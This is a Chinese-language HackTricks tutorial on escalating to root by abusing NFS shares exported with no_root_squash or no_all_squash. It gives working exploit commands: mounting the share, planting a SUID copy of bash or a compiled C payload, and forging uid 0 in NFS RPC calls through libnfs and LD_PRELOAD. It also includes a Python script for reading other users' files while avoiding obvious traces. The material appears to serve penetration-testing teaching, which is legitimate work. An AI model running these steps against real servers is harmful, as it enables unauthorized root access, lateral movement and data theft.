<details>

<summary><strong>零基础学习AWS黑客攻击直至成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现 [**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


阅读 _ **/etc/exports** _ 文件，如果您发现某个目录被配置为 **no\_root\_squash**，那么您可以**作为客户端访问**该目录，并且**以**本地**root**的身份**写入**该目录。

**no\_root\_squash**：这个选项基本上授权客户端的root用户以root身份访问NFS服务器上的文件。这可能导致严重的安全隐患。

**no\_all\_squash**：这与 **no\_root\_squash** 选项类似，但适用于**非root用户**。想象一下，您以nobody用户的身份获得了一个shell；检查了/etc/exports文件；存在no\_all\_squash选项；检查/etc/passwd文件；模拟一个非root用户；创建一个该用户的suid文件（通过使用nfs挂载）。以nobody用户身份执行suid并变成不同的用户。

# 权限提升

## 远程利用

如果您发现了这个漏洞，您可以利用它：

* **在客户端机器上挂载该目录**，并且**以root身份复制**到挂载文件夹中的 **/bin/bash** 二进制文件，并给予它 **SUID** 权限，并**从受害者**机器上执行该bash二进制文件。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* 在客户机上**挂载该目录**，并**以 root 身份复制**我们编译好的负载到挂载文件夹内，该负载将滥用 SUID 权限，给予它**SUID**权限，并**在受害者**机器上执行该二进制文件（你可以在这里找到一些[C SUID 负载](payloads-to-execute.md#c)）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## 本地利用

{% hint style="info" %}
请注意，如果您能够从您的机器到受害机器创建**隧道，您仍然可以使用远程版本来利用这个权限提升，通过隧道转发所需的端口**。\
以下技巧适用于 `/etc/exports` 文件**指定了一个IP地址**的情况。在这种情况下，您将**无法使用**任何情况下的**远程利用**，您将需要**利用这个技巧**。\
利用漏洞工作的另一个必要条件是，`/etc/export` 内的**导出必须使用 `insecure` 标志**。\
\--_我不确定如果 `/etc/export` 指出了一个IP地址这个技巧是否会起作用_--
{% endhint %}

**技巧复制自** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

现在，假设共享服务器仍然运行 `no_root_squash`，但有某些东西阻止我们在我们的渗透测试机器上挂载共享。如果 `/etc/exports` 中有一个明确列出允许挂载共享的IP地址列表，就会发生这种情况。

现在列出的共享显示，只有我们试图提权的机器被允许挂载它：
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
这意味着我们被困在本地从一个非特权用户挂载共享上进行利用。但恰好还有另一个不太为人所知的本地漏洞。

这个漏洞依赖于NFSv3规范中的一个问题，该规范要求客户端在访问共享时宣告其uid/gid。因此，如果共享已经挂载，通过伪造NFS RPC调用可以伪造uid/gid！

这里有一个[库可以让你做到这一点](https://github.com/sahlberg/libnfs)。

### 编译示例 <a href="#compiling-the-example" id="compiling-the-example"></a>

根据你的内核，你可能需要调整示例。在我的情况下，我不得不注释掉fallocate系统调用。
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 利用库进行攻击 <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

让我们使用最简单的攻击方法：
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
将我们的利用工具放在共享上，并通过伪造我们在RPC调用中的uid使其成为suid root：
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
剩下的就是启动它：
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
我们已经获得了本地root权限提升！

## 奖励 NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

一旦在机器上获得了本地root权限，我想要搜寻NFS共享中可能存在的秘密，这些秘密可以让我进行横向移动。但是有许多用户使用这个共享，他们都有自己的uid，尽管我是root，由于uid不匹配，我仍然无法读取这些文件。我不想留下明显的痕迹，比如执行chown -R命令，所以我编写了一个小代码片段，在运行所需的shell命令之前设置我的uid：
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
然后，您可以通过在它们前面加上脚本来运行大多数命令，如同平常一样：
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><strong>从零到英雄学习AWS黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
